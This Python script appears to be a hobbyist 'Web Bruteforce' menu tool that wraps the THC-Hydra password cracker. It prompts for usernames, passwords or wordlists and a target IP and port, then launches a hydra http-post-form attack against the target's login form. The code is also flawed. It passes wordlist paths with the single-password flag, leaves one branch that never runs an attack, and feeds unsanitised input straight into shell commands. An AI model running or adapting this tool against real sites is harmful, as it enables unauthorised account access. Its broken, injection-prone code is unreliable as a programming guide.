"""Code by Allistar from Star Sec.
Utililizes the Hydra Bruteforcing tool build by Vanhauser 
find their page at https://github.com/vanhauser-thc/thc-hydra
"""

import sys, os 

""" Banner """
def menu():
     print ("#     #                  ###### ")
     print ("#  #  # ###### #####     #     # #####  #    # ##### ######  ")
     print ("#  #  # #      #    #    #     # #    # #    #   #   #     ")
     print ("#  #  # #####  #####     ######  #    # #    #   #   #####   ")
     print ("#  #  # #      #    #    #     # #####  #    #   #   #    ")
     print ("#  #  # #      #    #    #     # #   #  #    #   #   #     ")
     print (" ## ##  ###### #####     ######  #    #  ####    #   ###### ")
     print (" Developed By STAR Sec - https://github.com/STAR-Sec")
     print (" --- |Bruteforcing Tool| ---")   
     print (" 1 - Web Bruteforce ")
     print (" 2 - More Comming Soon ")
""" Everything Else """
menu() 
while True:   
     Choice = input("Select Option/n>")
     if (Choice == '01' or Choice == '1'):
         os.system("clear")
         os.system("sleep 1")
         print ("!Try running Burpsuite Intercept/Fuzzer!")
         print ("!Some Webpages contain false positives and HSTS Security")
         print (" ")
         print ("Username: 1 - input, 2 - Wordlist")
         Choice1 = input("Option:  ")
         if (Choice1 == '01' or Choice1 == '1'):
             Username = input("Username")
             print (" ")
             print ("Password: 1 - input, 2 - Wordlist")
             Choice2 = input("Option:  ")
             if (Choice2 == '01' or Choice2 == '1'):
                 Password = input("Password: ")
                 os.system("clear")
                 IP = input("Target IP/Address: ")
                 Port = input("Target Port: ")
                 os.system("hydra -l %s -p %s %s -s %s http-post-form '/:password=^PASS^:Invalid password!'" % (Username, Password, IP, Port))
             elif (Choice2 == '02' or Choice2 == '2'):
                 Password = input("Path To Wordlist: ")
                 os.system("clear")
                 IP = input("Target IP/Address: ")
                 Port = input("Target Port: ")
                 os.system("hydra -l %s -p %s %s -s %s http-post-form '/:password=^PASS^:Invalid password!'" % (Username, Password, IP, Port))
              
        
         elif (Choice1 == '02' or Choice1 == '2'):
             PathUsername = input("Path To Wordlist: ")
             print (" ")
             print ("Password: 1 - input, 2 - Wordlist")
             Choice3 = input("Option:  ")
             if (Choice3 == '01' or Choice3 == '1'):
                 Password = input("Password: ")
                
             elif (Choice3 == '02' or Choice3 == '2'):
                 PathPassword = input("Path To Wordlist: ")
                
        
     else: 
         print ("Invalid Choice, please try again. ")
         os.system("clear")
    
    
    
